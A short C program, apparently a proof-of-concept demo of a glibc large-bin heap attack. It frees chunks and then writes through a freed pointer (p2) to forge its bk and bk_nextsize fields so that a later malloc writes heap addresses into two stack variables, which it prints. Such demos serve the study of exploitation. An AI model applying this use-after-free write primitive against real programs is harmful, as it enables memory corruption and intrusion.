#include <stdio.h>
#include <stdlib.h>
int main(int argc, char **argv){

	unsigned long var1 = 0;
	unsigned long var2 = 0;
	printf("%p:%ld\n", &var1, var1);
	printf("%p:%ld\n", &var2, var2);
	
	unsigned long* p1 = malloc(0x320);
	malloc(0x10);
	unsigned long* p2 = malloc(0x3f0);
	malloc(0x10);
	unsigned long* p3 = malloc(0x400);
	malloc(0x10);
	
	free(p1);
	free(p2);	
	void* p4 = malloc(0x90);
	free(p3);

	p2[0] = 0;
	p2[1] = (unsigned long)(&var1) - 0x10;
	p2[2] = 0;
	p2[3] = (unsigned long)(&var2) - 0x20;

	malloc(0x90);

	printf("%p:%p\n", &var1, (void*)var1);
        printf("%p:%p\n", &var2, (void*)var2);
	
	return 0;
}
